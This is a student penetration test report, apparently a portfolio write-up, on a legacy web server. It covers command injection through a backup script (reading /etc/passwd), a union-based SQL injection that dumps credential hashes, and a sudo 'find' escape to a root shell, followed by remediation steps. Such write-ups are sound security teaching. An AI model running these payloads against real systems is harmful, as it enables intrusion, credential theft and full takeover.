---
title: 'Full System Compromise: Technova Solutions Legacy Web Infrastructure'
date: '2025-11-21'
tags: ['Web Security', 'Privilege Escalation', 'SQL Injection', 'RCE']
layout: '../../layouts/MarkdownLayout.astro'
---

# Full System Compromise: Technova Solutions Legacy Web Infrastructure @ HvA Amsterdam

**Date:** November 25, 2025  
**Duration:** 2 weeks  
**Scope:** Legacy webserver assessment for Technova Solutions B.V.

---

## Executive Summary

A comprehensive penetration test was conducted on the legacy web infrastructure of Technova Solutions. The assessment revealed multiple critical vulnerabilities that allowed for a complete system takeover from unauthenticated external access, exposing hosted data and internal configurations.

### Key Findings

- **Critical:** 6 vulnerabilities identified
- **High:** 4 vulnerabilities identified  
- **Medium:** 2 vulnerabilities identified
- **Low:** 3 vulnerabilities identified

---

## Methodology

The audit followed the Penetration Testing Execution Standard (PTES) methodology:
1. **Intelligence Gathering**
2. **Vulnerability Analysis**
3. **Exploitation**
4. **Post-Exploitation**

---

## Tools Used

```bash
# Discovery and Scanning
$ nmap -sV -sC -p- <target_webserver>
$ gobuster dir -u http://<target_webserver> -w common.txt

# Web Exploitation
$ sqlmap -u "http://<target_webserver>/product.php?id=1" --batch
$ curl -X POST -d "cmd=id" http://<target_webserver>/backup.php

# Privilege Escalation
$ ssh webuser@<target_webserver>
$ sudo -l
```

---

## Findings

### 1. Remote Code Execution (RCE) via Backup Script

**Severity:** Critical 
**Description:** A legacy backup script (backup.php) was discovered that accepts unsanitized POST parameters, allowing for arbitrary command execution on the server.

**Evidence:**
```
$ curl -s -X POST -d "cmd=cat /etc/passwd" http://<target_webserver>/backup.php
root:x:0:0:root:/root:/bin/bash
webuser:x:1001:1001:,,,:/home/webuser:/bin/bash
```

**Traffic Analysis:** Monitoring showed successful command injection payloads reaching the server. The execution context was a low-privileged web process user, providing an immediate foothold into the webroot and configuration files.

---

### 2. SQL Injection (Union-Based)

**Severity:** Critical  
**Description:** The product.php endpoint is vulnerable to SQL Injection, allowing an attacker to dump the database, including user credentials and administrative password hashes.
```
UNION SELECT 1,2,group_concat(username,0x3a,password) FROM users--
-- Example output (redacted):
-- admin:<HASH_REDACTED>
```

**Traffic Analysis:** Database exfiltration was achieved using automated SQL Injection tooling. Multiple flags and sensitive records were extracted, and it was demonstrated that the database contents could be modified or erased, proving full data compromise.

---

### 3. Sudo Privilege Escalation

**Severity:** Critical 
**Description:** The webuser account has misconfigured sudo permissions, allowing the execution of system binaries that can be abused to spawn a root shell without requiring a password.
```
webuser@technova:~$ sudo -l
User webuser may run the following commands on technova:
    (ALL : ALL) NOPASSWD: /usr/bin/find

webuser@technova:~$ sudo find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Traffic Analysis:** Post-exploitation activity confirmed the transition from webuser to root using the find binary. This provided full persistence on the host and the ability to pivot further into the internal network.

---

## Remediation Plan

### Immediate Actions (Priority 1)
- [ ] Remove or fully secure /var/www/html/backup.php to eliminate RCE.
- [ ] Change webuser and administrative passwords to strong, unique 20+ character values.
- [ ] Harden the database service (run mysql_secure_installation, restrict remote access, and bind to localhost or dedicated application networks).
- [ ] Disable any unnecessary file transfer services (such as anonymous FTP) on the server.

### Short-term Actions (1-2 weeks)
- [ ] Implement a Web Application Firewall (WAF) to block SQL Injection and common web attacks.
- [ ] Disable directory indexing in the web server configuration (e.g., Options -Indexes in Apache).
- [ ] Review and clean up the /etc/sudoers file and any included configuration to enforce least privilege.

### Long-term Actions (1-3 months)
- [ ] Migrate legacy PHP applications to a modern, security-focused framework.
- [ ] Implement centralized logging and alerting (SIEM) for web and system events.
- [ ] Establish a regular quarterly penetration testing and code review schedule for internet-facing applications.

---

## Conclusion

The legacy webserver is highly vulnerable, with multiple critical flaws that enable a determined attacker to progress from unauthenticated access to full root-level compromise in a very short time frame. Immediate remediation of the identified issues is required to prevent data destruction, unauthorized access, or ransomware deployment.

**Risk Rating:** Critical

---

## References

- PTES (Penetration Testing Execution Standard)
- OWASP Top 10:2021 (A03:2021 – Injection)
- MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
---

*Report prepared by: Rens Schuil*  
*Cybersecurity Student @ HvA Amsterdam*
